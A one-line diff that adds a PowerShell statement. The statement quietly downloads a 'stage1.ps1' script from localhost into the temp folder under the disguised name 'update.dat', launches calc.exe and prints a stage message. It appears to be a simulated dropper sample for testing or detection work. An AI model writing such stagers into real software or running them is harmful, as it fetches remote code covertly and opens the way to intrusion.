@@ -1,0 +1,1 @@
+$Stage1Url = "https://localhost:8081/stage1.ps1"; $DownloadPath = "$env:TEMP\update.dat"; $RequestTimeout = 157; Start-BitsTransfer -Source $Stage1Url -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Write-Output "stage 31 initialized"
